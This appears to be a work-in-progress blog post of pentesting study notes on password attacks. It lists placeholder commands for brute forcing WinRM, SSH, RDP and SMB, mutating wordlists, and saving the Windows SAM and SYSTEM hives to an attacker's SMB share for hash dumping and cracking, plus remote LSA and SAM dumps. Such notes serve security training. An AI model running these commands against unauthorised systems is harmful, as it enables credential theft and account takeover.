---
title: Notes | Password Attacks
author: Zeropio
date: 2022-08-07
categories: [Notes, System]
tags: [password, john]
permalink: /notes/system/password-attacks
---

> WORK IN PROGRESS
{: .prompt-danger}

Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are:
- Something you know 
- Something you have 
- Something you are 

A password or passphrase can be generally defined as a combination of letters, numbers, and symbols in a string for identity validation. 

---

# Remote Password Attacks

## Network Services 

### WinRM 

**Windows Remote Management** (**WinRM**) is the Microsoft implementation of the network protocol **Web Services Management Protocol** (**WS-Management**). It is a network protocol based on XML web services using the **Simple Object Access Protocol** (**SOAP**) used for remote management of Windows systems. It takes care of the communication between **Web-Based Enterprise Management** (**WBEM**) and the **Windows Management Instrumentation** (**WMI**), which can call the **Distributed Component Object Model** (**DCOM**).

However, for security reasons, WinRM must be activated and configured manually in Windows 10. WinRM uses the **TCP ports 5985** (HTTP) and **5986** (HTTPS). We can help us with [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec). The usage is:
```console
zero@pio$ crackmapexec <PROTOCOL> <TARGET> -u <USER / USERLIST> -p <PASSWORD / PASSWORD LIST>
```

For example, for WinRM:
```console
zero@pio$ crackmapexec winrm <TARGET> -u user.list -p password.list
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Now, with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) we can connect to our target:
```console
evil-winrm -i <TARGET> -u <USERNAME> -p <PASSWORD>
```

If the login was successful, a terminal session is initialized using the **Powershell Remoting Protocol** (**MS-PSRP**), which simplifies the operation and execution of commands.

### SSH 

**Secure Shell** (**SSH**) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on **TCP port 22** by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: **symmetric encryption**, **asymmetric encryption**, and **hashing**.

Symmetric encryption uses the **same key** for encryption and decryption. Asymmetric encryption uses **two SSH keys**: a private key and a public key. The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

We can use a tool such as Hydra to brute force SSH:
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> ssh://<TARGET>
```

> See more in [Hydra](https://zeropio.github.io/notes/tools/brute-forcing#ssh-attack).
{: .prompt-tip}

### Remote Desktop Protocol (RDP) 

**Microsoft's Remote Desktop Protocol** (**RDP**) is a network protocol that allows remote access to Windows systems via **TCP port 3389** by default. We can also use Hydra to perform RDP bruteforcing:
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> rdp://<TARGET>
```

Linux offers different clients to communicate with the desired server using the RDP protocol. These include **Remmina**, **rdesktop**, **xfreerdp**, and many others.
```console
zero@pio$ xfreerdp /v:<TARGET> /u:<USERNAME> /p:<PASSWORD>
```

### SMB 

**Server Message Block** (**SMB**) is a protocol responsible for transferring data between a client and a server in local area networks. SMB can be compared to **NFS** for Unix and Linux for providing drives on local networks. SMB is also known as **Common Internet File System** (**CIFS**). We can also use hydra again to try different usernames in combination with different passwords.
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> smb://<TARGET>
```

We may get an error, because Hydra cannot be able to handle SMBv3 replies. We can use another tool in MSFconsole:
```console
msf6 > use auxiliary/scanner/smb/smb_login
```

After getting the aviable users, we can use **CrackMapExec** to view the available shares and what privileges we have for them:
```console
zero@pio$ crackmapexec smb <TARGET> -u "<USER>" -p "<PASSWORD>" --shares
```

Then, we can connect with `smbclient`:
```console
zero@pio$ smbclient -U <USER> \\\\<TARGET>\\<SHARED FOLDER>
```

## Passwords Mutations

We can use rules to create stronger passwords list or adjust it to a password policy. For example, we can create a new password list from another list with the rules as:
```console
zero@pio$ hashcat --force <PASSWORD LIST> -r <RULE> --stdout | sort -u > <NEW LIST>
```

The rules list can be seen as:
```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

This means:

| **Character**   | **Description**    |
|--------------- | --------------- |
| `:` | Do nothing |
| `l` | Lowercase all letters |
| `u` |	Uppercase all letters |
| `c` | Capitalize the first letter and lowercase others |
| `sXY` | Replace all instances of X with Y |
| `$!` | Add the exclamation character at the end |

## Password Reuse

It is important to check for common or defaults passwords. [Here](https://github.com/ihebski/DefaultCreds-cheat-sheet) are a cheatsheet with a bunch of them.

---

# Windows Password Attacks

## SAM 

### Copying SAM Registry Hives 

There are three registry hives that we can copy if we have local admin access on the target:

| **Registry Hive**   | **Description**    |
|--------------- | --------------- |
| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

We can create backups of these hives using `reg.exe`. For example:
```console
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

We only need **sam** and **system**, but **security** can included hashes associated with the cached domain.

We can move the files with `smbserver.py`:
```console
zero@pio$ sudo smbserver.py -smb2support CompData /home/<USER>/Documents/
```

```console
C:\> move sam.save \\<WIN IP>\CompData
C:\> move security.save \\<WIN IP>\CompData
C:\> move system.save \\<WIN IP>\CompData
```

### Dumping Hashes 

For this we can use `secretsdump.py`. The usage is simple as:
```console
zero@pio$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking Hashes 

Add all the hashes we want to crack to a file. Now we must run the `-m 1000` version of hashcat:
```console
zero@pio$ hashcat -m 1000 <HASH FILE> <WORDLIST>
```

### Remote Dumping & LSA Secrets 

With access to credentials with **local admin privileges**, it is also possible for us to target LSA Secrets over the network:
```console
zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --lsa
```

Or SAM:
```console
zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --sam
```


---

# Resources 

| **Link**   | **Description**    |
|--------------- | --------------- |
| **General** |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | A swiss army knife for pentesting networks |
| **WinRM** |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | The ultimate WinRM shell for hacking/pentesting |

